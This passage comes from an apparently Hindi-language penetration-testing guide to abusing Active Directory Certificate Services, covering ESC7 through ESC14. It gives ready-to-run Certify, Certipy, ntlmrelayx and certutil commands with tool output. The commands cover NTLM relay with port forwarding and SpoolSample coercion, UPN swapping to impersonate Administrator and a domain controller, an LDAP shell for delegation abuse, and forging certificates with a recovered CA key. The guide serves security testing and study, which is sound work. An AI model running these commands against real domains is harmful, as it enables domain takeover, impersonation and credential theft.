[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### व्याख्या

क्लासिक ESC7 abuses (EDITF attributes enable करना या pending requests को approve करना) के अलावा, **Certify 2.0** ने एक नया primitive उजागर किया, जिसके लिए Enterprise CA पर केवल *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role की आवश्यकता होती है।<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method को *Manage Certificates* रखने वाला कोई भी principal execute कर सकता है। पहले इस method का उपयोग वैध CAs द्वारा **pending** requests पर extensions अपडेट करने के लिए किया जाता था, लेकिन attacker इसका दुरुपयोग करके approval की प्रतीक्षा कर रही request में **एक *non-default* certificate extension जोड़** सकता है (उदाहरण के लिए, `1.1.1.1` जैसा custom *Certificate Issuance Policy* OID)।

क्योंकि लक्षित template उस extension के लिए **default value निर्धारित नहीं करता**, इसलिए request जारी होने पर CA attacker द्वारा नियंत्रित value को overwrite नहीं करेगा। परिणामस्वरूप certificate में attacker द्वारा चुना गया extension शामिल होगा, जो:

* अन्य vulnerable templates की Application / Issuance Policy requirements पूरी कर सकता है (जिससे privilege escalation हो सकती है)।
* अतिरिक्त EKUs या policies जोड़ सकता है, जो third-party systems में certificate को अप्रत्याशित trust प्रदान करें।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 का “कम शक्तिशाली” हिस्सा माना जाता था — अब CA configuration को छुए बिना या अधिक प्रतिबंधित *Manage CA* right की आवश्यकता के बिना, full privilege escalation या long-term persistence के लिए इस्तेमाल किया जा सकता है।

#### Certify 2.0 से इस primitive का दुरुपयोग

1. **ऐसी certificate request submit करें जो *pending* रहे।** इसे manager approval आवश्यक करने वाले template से मजबूर किया जा सकता है:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **नए `manage-ca` command का उपयोग करके pending request में एक custom extension जोड़ें**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *यदि template में पहले से *Certificate Issuance Policies* extension परिभाषित नहीं है, तो issuance के बाद ऊपर दिया गया मान सुरक्षित रहेगा।*

3. **request जारी करें** (यदि आपकी भूमिका के पास *Manage Certificates* approval rights भी हैं) या किसी operator द्वारा इसे approve करने की प्रतीक्षा करें। जारी होने के बाद, certificate डाउनलोड करें:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. परिणामी certificate में अब malicious issuance-policy OID शामिल है और इसका उपयोग बाद के attacks (जैसे ESC13, domain escalation आदि) में किया जा सकता है।

> NOTE: यही attack, `ca` command और `-set-extension` parameter के ज़रिए Certipy ≥ 4.7 में भी execute किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> जिन environments में **AD CS installed है**, यदि कोई **vulnerable web enrollment endpoint मौजूद है** और कम-से-कम एक **certificate template published है** जो **domain computer enrollment और client authentication** की अनुमति देता है (जैसे default **`Machine`** template), तो **spooler service active वाले किसी भी computer को attacker compromise कर सकता है**!

AD CS कई **HTTP-based enrollment methods** को support करता है, जिन्हें administrators द्वारा install किए जा सकने वाले अतिरिक्त server roles के ज़रिए उपलब्ध कराया जाता है। HTTP-based certificate enrollment के ये interfaces **NTLM relay attacks** के लिए susceptible हैं। **Compromised machine से attacker, inbound NTLM के ज़रिए authenticate होने वाले किसी भी AD account का impersonate कर सकता है**। Victim account का impersonation करते हुए, attacker इन web interfaces को access करके **`User` या `Machine` certificate templates का उपयोग करके client authentication certificate request कर सकता है**।

- **Web enrollment interface** (एक पुराना ASP application, जो `http://<caserver>/certsrv/` पर उपलब्ध है) default रूप से केवल HTTP का उपयोग करता है, जो NTLM relay attacks से सुरक्षा नहीं देता। इसके अलावा, यह अपने Authorization HTTP header के ज़रिए केवल NTLM authentication की स्पष्ट रूप से अनुमति देता है, जिससे Kerberos जैसी अधिक secure authentication methods लागू नहीं हो पातीं।
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service और **Network Device Enrollment Service** (NDES), default रूप से अपने Authorization HTTP header के ज़रिए negotiate authentication support करते हैं। Negotiate authentication, Kerberos और **NTLM दोनों को support करता है**, जिससे attacker relay attacks के दौरान authentication को **NTLM पर downgrade कर सकता है**। हालाँकि ये web services default रूप से HTTPS enable करती हैं, लेकिन केवल HTTPS **NTLM relay attacks से सुरक्षा नहीं देता**। HTTPS services पर NTLM relay attacks से सुरक्षा तभी संभव है, जब HTTPS के साथ channel binding का उपयोग किया जाए। दुर्भाग्यवश, AD CS IIS पर Extended Protection for Authentication activate नहीं करता, जो channel binding के लिए आवश्यक है।<sup>[[6]](#references)</sup>

NTLM relay attacks की एक आम **समस्या** NTLM sessions की **कम अवधि** और उन services के साथ interact न कर पाना है जिन्हें **NTLM signing की आवश्यकता होती है**।

फिर भी, user के लिए certificate हासिल करने हेतु NTLM relay attack का इस्तेमाल करके इस सीमा को दूर किया जा सकता है, क्योंकि session की अवधि certificate की validity period से तय होती है, और certificate का उपयोग उन services के साथ किया जा सकता है जो **NTLM signing अनिवार्य करती हैं**। चोरी हुए certificate का उपयोग करने के निर्देशों के लिए, देखें:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक और सीमा यह है कि **victim account को attacker-controlled machine से authenticate करना आवश्यक है**। Attacker या तो इंतज़ार कर सकता है या इस authentication को **force** करने की कोशिश कर सकता है:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) का `cas`, **enabled HTTP AD CS endpoints** enumerate करता है:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` प्रॉपर्टी का उपयोग एंटरप्राइज़ Certificate Authorities (CAs) द्वारा Certificate Enrollment Service (CES) एंडपॉइंट्स को संग्रहीत करने के लिए किया जाता है। इन एंडपॉइंट्स को **Certutil.exe** टूल का उपयोग करके पार्स करके सूचीबद्ध किया जा सकता है:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify के साथ दुरुपयोग

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

डिफ़ॉल्ट रूप से, Certipy प्रमाणपत्र के लिए अनुरोध `Machine` या `User` टेम्पलेट के आधार पर करता है। यह इस बात से निर्धारित होता है कि रिले किए जा रहे अकाउंट का नाम `$` पर समाप्त होता है या नहीं। वैकल्पिक टेम्पलेट निर्दिष्ट करने के लिए `-template` पैरामीटर का उपयोग किया जा सकता है।

इसके बाद, प्रमाणीकरण को बाध्य करने के लिए [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी तकनीक का उपयोग किया जा सकता है। डोमेन कंट्रोलर के मामले में, `-template DomainController` निर्दिष्ट करना आवश्यक है।

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## कोई Security Extension नहीं - ESC9 <a href="#id-5485" id="id-5485"></a>

### व्याख्या

**`msPKI-Enrollment-Flag`** के लिए **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) मान, जिसे ESC9 कहा जाता है, certificate से `szOID_NTDS_CA_SECURITY_EXT` SID extension को हटा देता है। ESC9 के पुराने उदाहरण KDC compatibility behavior (`StrongCertificateBindingEnforcement=1`) या अलग, कमजोर Schannel mapping मार्ग पर निर्भर करते हैं। मान `1` एक **ऐतिहासिक compatibility setting** है, वर्तमान default नहीं: Microsoft के अनुसार, 9 सितंबर, 2025 के Windows security update के बाद KDC override का समर्थन बंद हो गया। पुराने निर्देश लागू करने से पहले target के वास्तविक update और authentication endpoint की जाँच करें।<sup>[[7]](#references)</sup> [Microsoft की rollout guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) देखें।

वे स्थितियाँ जिनमें इस flag की setting महत्वपूर्ण हो जाती है:

- पुराने, compatible KDC पर, प्रभावी certificate-binding policy mapping की अनुमति देती है; या Schannel endpoint अलग से `CertificateMappingMethods` bit `0x4` के माध्यम से UPN mapping सक्षम करता है।
- Certificate को `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ चिह्नित किया गया है।
- Certificate में कोई client authentication EKU निर्दिष्ट है।
- किसी अन्य account को compromise करने के लिए उस पर `GenericWrite` permissions उपलब्ध हैं।

### दुरुपयोग का परिदृश्य

मान लें कि `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` permissions हैं और लक्ष्य `Administrator@corp.local` को compromise करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` को enroll करने की अनुमति है, अपनी `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ configure किया गया है।

शुरुआत में, `John` के `GenericWrite` की मदद से Shadow Credentials का उपयोग करके `Jane` का hash हासिल किया जाता है:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

इसके बाद, `Jane` का `userPrincipalName` जानबूझकर `@corp.local` डोमेन हिस्से को छोड़ते हुए `Administrator` में संशोधित किया जाता है:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

यह संशोधन बाधाओं का उल्लंघन नहीं करता, क्योंकि `Administrator@corp.local`, `Administrator` के `userPrincipalName` से अलग रहता है।

इसके बाद, कमज़ोर के रूप में चिह्नित `ESC9` certificate template का अनुरोध `Jane` के रूप में किया जाता है:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

यह नोट किया गया है कि प्रमाणपत्र का `userPrincipalName` `Administrator` दर्शाता है, जिसमें कोई “object SID” नहीं है।

इसके बाद `Jane` का `userPrincipalName` उसके मूल मान, `Jane@corp.local`, पर वापस सेट कर दिया जाता है:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

जारी किए गए certificate से अब authentication करने पर `Administrator@corp.local` का NT hash मिलता है। Certificate में domain निर्दिष्ट न होने के कारण command में `-domain <domain>` शामिल करना आवश्यक है:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## कमजोर Certificate Mappings - ESC10

### व्याख्या

ESC10 के अंतर्गत अक्सर दो अलग-अलग certificate-mapping policies पर चर्चा की जाती है। उस endpoint की setting पढ़ें जो वास्तव में संबंधित authentication को संभालता है:

- एप्लिकेशन सर्वर पर Schannel `CertificateMappingMethods`, `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत, TLS client-certificate mapping को नियंत्रित करता है। UPN bit `0x4` है; अपडेट किए गए सिस्टम पर default `0x18` (`0x8 | 0x10`) है।
- KDC `StrongCertificateBindingEnforcement`, `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत, ऐतिहासिक रूप से Kerberos certificate-binding compatibility को नियंत्रित करता था। Value `1` को वर्तमान default मानना विश्वसनीय नहीं है, और Microsoft ने 9 सितंबर, 2025 के Windows security update के साथ इस override का समर्थन समाप्त कर दिया। इसकी स्थिति से Schannel की UPN mapping का अपने-आप पता नहीं चलता।<sup>[[7]](#references)</sup>

**केस 1**

ऐतिहासिक रूप से, जब कोई पुराना KDC `StrongCertificateBindingEnforcement=0` को लागू करता था; update level की पुष्टि करें, क्योंकि वर्तमान patched systems पर यह override अब समर्थित नहीं है।

**केस 2**

जब Schannel client-certificate endpoint पर `CertificateMappingMethods` का UPN bit (`0x4`) सक्षम हो। यह KDC strong-binding enforcement से अलग setting है और इसके लिए अभी भी enroll किए जा सकने वाले client-authentication certificate और mapped account attribute पर प्रभावी नियंत्रण की आवश्यकता होती है।

### Abuse Case 1

पुराने deployment में, जहाँ KDC अब भी `StrongCertificateBindingEnforcement=0` को लागू करता है, किसी account के `userPrincipalName` पर नियंत्रण, दूसरे account तक पहुँचने के लिए weak-mapping path का हिस्सा बन सकता है। आवश्यक certificate enrollment, mapping, target identity और सफल authentication की अलग-अलग जाँच करनी चाहिए; केवल `GenericWrite` ACE या registry value से account takeover साबित नहीं होता।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` permissions होने पर, attacker का लक्ष्य `Administrator@corp.local` को compromise करना है। यह प्रक्रिया ESC9 जैसी है, जिसमें किसी भी certificate template का उपयोग किया जा सकता है।

सबसे पहले, `GenericWrite` का दुरुपयोग करके Shadow Credentials के माध्यम से `Jane` का hash प्राप्त किया जाता है।

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

इसके बाद, `Jane` का `userPrincipalName` जानबूझकर `Administrator` में बदल दिया जाता है और सीमा उल्लंघन से बचने के लिए `@corp.local` वाला हिस्सा छोड़ दिया जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

इसके बाद, डिफ़ॉल्ट `User` template का उपयोग करके `Jane` के रूप में client authentication सक्षम करने वाला certificate अनुरोध किया जाता है।

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` का `userPrincipalName` फिर उसके मूल मान, `Jane@corp.local`, पर वापस कर दिया जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

प्राप्त certificate से authenticate करने पर `Administrator@corp.local` का NT hash मिलेगा। चूँकि certificate में domain की जानकारी नहीं है, इसलिए command में domain निर्दिष्ट करना आवश्यक है।

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### दुरुपयोग का मामला 2

`CertificateMappingMethods` में `UPN` bit flag (`0x4`) होने पर, `GenericWrite` permissions वाला account A, `userPrincipalName` property से रहित किसी भी account B को compromise कर सकता है। इसमें machine accounts और built-in domain administrator `Administrator` भी शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को compromise करना है। इसकी शुरुआत `GenericWrite` का लाभ उठाकर Shadow Credentials के माध्यम से `Jane` का hash प्राप्त करने से होती है।

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

डिफ़ॉल्ट `User` template का उपयोग करके client authentication के लिए `Jane` के नाम से एक certificate अनुरोध किया जाता है।

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल मान पर वापस लौट जाता है।

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Schannel के माध्यम से authenticate करने के लिए Certipy का `-ldap-shell` विकल्प उपयोग किया जाता है, जो `u:CORP\DC$` के रूप में authentication की सफलता दर्शाता है।

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

LDAP shell के माध्यम से, `set_rbcd` जैसे commands Resource-Based Constrained Delegation (RBCD) attacks सक्षम करते हैं, जिससे domain controller से संभावित रूप से समझौता हो सकता है।

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

यह vulnerability ऐसे किसी भी user account तक भी विस्तारित होती है जिसमें `userPrincipalName` मौजूद न हो या जिसका मान `sAMAccountName` से मेल न खाता हो। डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख target है, क्योंकि इसके LDAP privileges ऊँचे होते हैं और डिफ़ॉल्ट रूप से इसमें `userPrincipalName` मौजूद नहीं होता।

## Relaying NTLM to ICPR - ESC11

### व्याख्या

यदि CA Server को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ configure नहीं किया गया है, तो RPC service के ज़रिए signing के बिना NTLM relay attacks किए जा सकते हैं। [यहाँ संदर्भ देखें](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

आप यह जाँचने के लिए `certipy` का उपयोग कर सकते हैं कि `Enforce Encryption for Requests` Disabled है या नहीं। यदि ऐसा है, तो certipy `ESC11` Vulnerabilities दिखाएगा।

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### दुरुपयोग परिदृश्य

इसके लिए एक relay server सेट अप करना आवश्यक है:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

नोट: डोमेन कंट्रोलर्स के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करके:

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## ADCS CA तक YubiHSM के साथ Shell access - ESC12

### व्याख्या

Administrators Certificate Authority को इस तरह सेट अप कर सकते हैं कि वह इसे "Yubico YubiHSM2" जैसे किसी बाहरी डिवाइस पर स्टोर करे।

अगर USB डिवाइस CA server से USB port के ज़रिए कनेक्ट है, या CA server virtual machine होने की स्थिति में USB device server से कनेक्ट है, तो YubiHSM में keys generate और उपयोग करने के लिए Key Storage Provider को एक authentication key (जिसे कभी-कभी "password" कहा जाता है) की ज़रूरत होती है।

यह key/password registry में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के अंतर्गत cleartext में स्टोर होता है।

संदर्भ [यहाँ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) है।<sup>[[11]](#references)</sup>

### Abuse Scenario

अगर shell access मिलने पर CA की private key किसी physical USB device पर स्टोर हो, तो key को recover करना संभव है।

पहले, आपको CA certificate (यह public होता है) प्राप्त करना होगा और फिर:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

अंत में, CA certificate और उसकी private key का उपयोग करके नया मनमाना certificate forge करने के लिए certutil `-sign` command का उपयोग करें।

## OID Group Link Abuse - ESC13

### विवरण

`msPKI-Certificate-Policy` attribute, certificate template में issuance policy जोड़ने की अनुमति देता है। Issuance policies के लिए ज़िम्मेदार `msPKI-Enterprise-Oid` objects को PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में खोजा जा सकता है। इस object के `msDS-OIDToGroupLink` attribute का उपयोग करके किसी policy को AD group से link किया जा सकता है। इससे system उस user को, जो certificate प्रस्तुत करता है, ऐसे authorize कर सकता है मानो वह group का सदस्य हो। [इसका संदर्भ यहाँ](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)।<sup>[[12]](#references)</sup>

दूसरे शब्दों में, जब किसी user के पास certificate enroll करने की permission हो और certificate किसी OID group से link हो, तो user इस group के privileges प्राप्त कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### दुरुपयोग का परिदृश्य

ऐसी user permission खोजें जिसका उपयोग `certipy find` या `Certify.exe find /showAllPermissions` कर सके।

अगर `John` के पास `VulnerableTemplate` में enroll करने की permission है, तो user `VulnerableGroup` group के privileges प्राप्त कर सकता है।

उसे बस template निर्दिष्ट करना होगा; उसे OIDToGroupLink rights वाला certificate मिल जाएगा।

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## स्पष्ट Certificate Mapping का दुरुपयोग — ESC14

### विवरण

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping पर दिया गया विवरण असाधारण रूप से व्यापक है। नीचे मूल पाठ का उद्धरण दिया गया है।<sup>[[14]](#references)</sup>

ESC14 उन कमजोरियों से संबंधित है जो "कमज़ोर explicit certificate mapping" से उत्पन्न होती हैं। इसका मुख्य कारण Active Directory यूज़र या कंप्यूटर अकाउंट के `altSecurityIdentities` attribute का दुरुपयोग या असुरक्षित कॉन्फ़िगरेशन है। यह multi-valued attribute एडमिनिस्ट्रेटर को प्रमाणीकरण के लिए X.509 certificates को किसी AD अकाउंट से मैन्युअल रूप से जोड़ने की अनुमति देता है। जब ये explicit mappings मौजूद होते हैं, तो वे डिफ़ॉल्ट certificate mapping logic को override कर सकते हैं। यह logic आमतौर पर certificate के SAN में UPN या DNS names, या `szOID_NTDS_CA_SECURITY_EXT` security extension में embedded SID पर निर्भर होता है।

"कमज़ोर" mapping तब होती है, जब `altSecurityIdentities` attribute में किसी certificate की पहचान के लिए इस्तेमाल की गई string value बहुत व्यापक हो, आसानी से अनुमानित हो, non-unique certificate fields पर निर्भर हो, या आसानी से spoof किए जा सकने वाले certificate components का उपयोग करती हो। यदि कोई attacker ऐसा certificate प्राप्त कर सकता है या बना सकता है, जिसके attributes किसी privileged account के लिए कमज़ोर तरीके से परिभाषित explicit mapping से मेल खाते हों, तो वह उस certificate का उपयोग करके उस अकाउंट के रूप में authenticate और impersonate कर सकता है।

संभावित रूप से कमज़ोर `altSecurityIdentities` mapping strings के उदाहरण:

- केवल एक सामान्य Subject Common Name (CN) के आधार पर mapping: जैसे, `X509:<S>CN=SomeUser`। Attacker किसी कम सुरक्षित स्रोत से इस CN वाला certificate प्राप्त कर सकता है।
- किसी विशिष्ट serial number या subject key identifier जैसी अतिरिक्त जानकारी के बिना अत्यधिक सामान्य Issuer Distinguished Names (DNs) या Subject DNs का उपयोग: जैसे, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`।
- अन्य अनुमानित patterns या non-cryptographic identifiers का उपयोग, जिन्हें attacker ऐसे certificate में शामिल कर सकता है जिसे वह वैध रूप से प्राप्त या forge कर सकता है (यदि उसने CA को compromise किया हो या ESC1 की तरह कोई vulnerable template पाया हो)।

`altSecurityIdentities` attribute mapping के लिए विभिन्न formats का समर्थन करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (पूरे Issuer और Subject DN के आधार पर mapping)
- `X509:<SKI>SubjectKeyIdentifier` (certificate के Subject Key Identifier extension value के आधार पर mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number के आधार पर mapping, जिसमें Issuer DN से implicit qualification होता है) - यह standard format नहीं है; आमतौर पर इसका format `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 name, आमतौर पर email address, के आधार पर mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate की raw public key के SHA1 hash के आधार पर mapping - आम तौर पर मज़बूत)

इन mappings की सुरक्षा, mapping में शामिल identifiers पर निर्भर करती है। Microsoft email या subject names पर आधारित mappings, जिनमें `X509:<RFC822>` शामिल है, को **कमज़ोर** वर्गीकृत करता है। Full Enforcement mode में, मज़बूत mapping के बिना certificate अस्वीकार कर दिया जाता है; सितंबर 2025 के Windows security update ने Compatibility mode में वापस जाने का विकल्प हटा दिया। इसलिए केवल कमज़ोर mapping, impersonation का भरोसेमंद वर्तमान रास्ता नहीं है। कमज़ोर mapping वाले scenario का आकलन करने से पहले domain controller का वास्तविक patch level और certificate-mapping behavior जाँचें। `altSecurityIdentities` में write access होना एक अलग सुराग है: उपयुक्त trusted certificate वाला attacker, प्रभावी permissions और certificate validation की शर्तों के अधीन, **मज़बूत** explicit mapping जोड़ने में सक्षम हो सकता है। देखें [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) और [ESC14 पर शोध](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)।

Certificate authentication विफलताओं की जाँच भी ज़रूरी है: target account disabled होने या उसका password expire होने से login विफल हो सकता है, भले ही certificate स्वयं valid हो।

### दुरुपयोग का परिदृश्य

ESC14 Active Directory (AD) में **explicit certificate mappings**, विशेष रूप से `altSecurityIdentities` attribute को निशाना बनाता है। यदि यह attribute सेट है (जानबूझकर या गलत कॉन्फ़िगरेशन के कारण), तो attackers mapping से मेल खाते certificates प्रस्तुत करके अकाउंट impersonate कर सकते हैं।

#### Scenario A: Attacker `altSecurityIdentities` में लिख सकता है

 **पूर्वशर्त**: Attacker के पास target account के `altSecurityIdentities` attribute में write permissions हैं, या target AD object पर निम्नलिखित में से किसी permission के ज़रिए यह permission देने का अधिकार है:  
- `altSecurityIdentities` की Write property  
- `Public-Information` की Write property  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*।
#### Scenario B: Target में X509RFC822 (Email) के ज़रिए कमज़ोर mapping है

- **ऐतिहासिक/सशर्त पूर्वशर्त**: Target के `altSecurityIdentities` में कमज़ोर X509RFC822 mapping है, attacker किसी enrollee का `mail` attribute संपादित कर सकता है, और किसी उपयुक्त template में वह email client-authentication certificate में शामिल होता है तथा उससे विरोधी SID binding नहीं होती। Authentication के लिए ऐसे environment की भी ज़रूरत है जो अभी भी कमज़ोर mapping स्वीकार करता हो; Full Enforcement केवल कमज़ोर certificate mappings को अस्वीकार करता है। केवल writable `mail` attribute होना एक सुराग भर है।
#### Scenario C: Target में X509IssuerSubject mapping है

- **पूर्वशर्त**: Target के `altSecurityIdentities` में कमज़ोर X509IssuerSubject explicit mapping है। Attacker किसी victim principal के `cn` या `dNSHostName` attribute को इस तरह सेट कर सकता है कि वह target की X509IssuerSubject mapping के subject से मेल खाए। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और इस certificate का उपयोग target के रूप में authenticate करने के लिए कर सकता है।
#### Scenario D: Target में X509SubjectOnly mapping है

